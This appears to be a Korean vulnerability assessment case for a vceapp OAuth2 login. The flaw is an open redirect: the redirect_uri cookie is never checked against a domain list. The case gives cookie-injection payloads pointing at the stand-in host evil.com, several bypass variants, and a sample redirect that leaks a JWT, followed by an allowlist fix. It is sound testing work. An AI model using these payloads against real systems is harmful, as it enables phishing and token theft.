================================================================================
[VCE-AUTH-02] OAuth2 쿠키 redirect_uri 도메인 검증 없음 → Open Redirect
도메인: auth
================================================================================

## 1. 진단 항목 개요

- **항목명**: 검증되지 않은 리다이렉트 (Open Redirect via OAuth2 Cookie)
- **번호**: AUTH-02
- **위험도**: High
- **OWASP**: A01:2021 – Broken Access Control

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/oauth2/authorization/google |
| 운영 | https://vceapp.com/oauth2/authorization/google |
| HTTP 메서드 | GET (OAuth2 인증 흐름 시작) |
| 인증 요건 | 없음 |

관련 엔드포인트:
- GET  /oauth2/authorization/google
- GET  /login/oauth2/code/google (OAuth2 콜백)
- OAuth2SuccessHandler.java:43-55 — 쿠키에서 redirect_uri 읽어 리다이렉트

## 3. 취약점 원리 (Why this works)

OAuth2 로그인 흐름에서 사용자는 Google 인증 후 애플리케이션으로 돌아온다.
이때 "어디로 돌아갈지" 결정하는 redirect_uri가 쿠키에 저장된다.

`OAuth2SuccessHandler.java:43-55`에서:
```java
String redirectUri = CookieUtils.getCookie(request, REDIRECT_URI_PARAM_COOKIE_NAME)
    .map(Cookie::getValue)
    .orElse(getDefaultTargetUrl());

// 도메인 검증 없이 바로 리다이렉트
getRedirectStrategy().sendRedirect(request, response, redirectUri);
```

공격자가 OAuth2 로그인 시작 전에 `redirect_after_login` 쿠키를 `https://evil.com`으로
설정해두면, 로그인 성공 후 피해자가 evil.com으로 리다이렉트된다.

피싱 시나리오:
1. 공격자가 `https://vceapp.com/oauth2/authorization/google` 링크에 쿠키 조작 포함
2. 피해자가 Google 로그인 완료
3. JWT 토큰이 evil.com으로 전달됨 (URL 파라미터 또는 Referer 헤더)

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. Burp Suite 실행
2. 브라우저 개발자도구 → Application → Cookies 열어두기

---

### Step 1. 정상 OAuth2 흐름에서 쿠키 확인

브라우저에서 Google OAuth2 로그인 시도:
```
GET /oauth2/authorization/google HTTP/1.1
Host: localhost:8080
```

Burp에서 요청/응답 캡처. 쿠키 이름 확인 (예: `redirect_after_login`, `REDIRECT_URI` 등).

---

### Step 2. 악성 redirect_uri 쿠키 주입

브라우저 개발자도구 콘솔에서:
```javascript
document.cookie = "redirect_after_login=https://evil.com; path=/";
```

또는 Burp Suite에서 OAuth2 요청에 쿠키 헤더 추가:
```
GET /oauth2/authorization/google HTTP/1.1
Host: localhost:8080
Cookie: redirect_after_login=https://evil.com
```

---

### Step 3. OAuth2 로그인 완료 후 리다이렉트 관찰

Google 로그인 완료 후:
- 정상: `https://exchange.vceapp.com/crypto` 등 자체 도메인으로 리다이렉트
- 취약: `https://evil.com` 으로 리다이렉트 + JWT 토큰이 URL에 포함될 수 있음

Burp Suite에서 콜백 응답 확인:
```
HTTP/1.1 302 Found
Location: https://evil.com?token=eyJhbGci...
```

---

### Step 4. 상대 경로 우회 시도

```javascript
// 프로토콜 상대경로 우회
document.cookie = "redirect_after_login=//evil.com; path=/";

// URL 인코딩 우회
document.cookie = "redirect_after_login=https%3A%2F%2Fevil.com; path=/";

// 자체 도메인 prefix 우회
document.cookie = "redirect_after_login=https://vceapp.com.evil.com; path=/";
```

---

### Step 5. redirect_uri 쿼리파라미터 직접 주입 시도

```
GET /oauth2/authorization/google?redirect_uri=https://evil.com HTTP/1.1
Host: localhost:8080
```

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 로그인 후 Location 헤더에 `https://evil.com` 포함
- 자체 도메인이 아닌 외부 도메인으로 리다이렉트 발생
- JWT 토큰이 evil.com으로 전달됨

✗ **안전 (Not Vulnerable)**:
- 허용 도메인 목록(allowlist) 검증 후 불허 도메인이면 기본 URL로 리다이렉트
- 에러 응답 또는 로그인 페이지로 돌아감

## 6. 예상 취약 포인트 (코드 위치)

- `OAuth2SuccessHandler.java:43-55` — 쿠키에서 읽은 redirect_uri 도메인 검증 없이 사용
- `HttpCookieOAuth2AuthorizationRequestRepository.java` — 쿠키 저장 로직

## 7. 권고 조치

- redirect_uri 허용 도메인 화이트리스트 검증:
  ```java
  List<String> allowedDomains = List.of("exchange.vceapp.com", "bank.vceapp.com", "localhost");
  URI uri = URI.create(redirectUri);
  if (!allowedDomains.contains(uri.getHost())) {
      redirectUri = getDefaultTargetUrl();
  }
  ```
- 상대 경로만 허용하는 방식으로 제한
- OAuth2 state 파라미터를 활용한 CSRF 방지 병행 적용
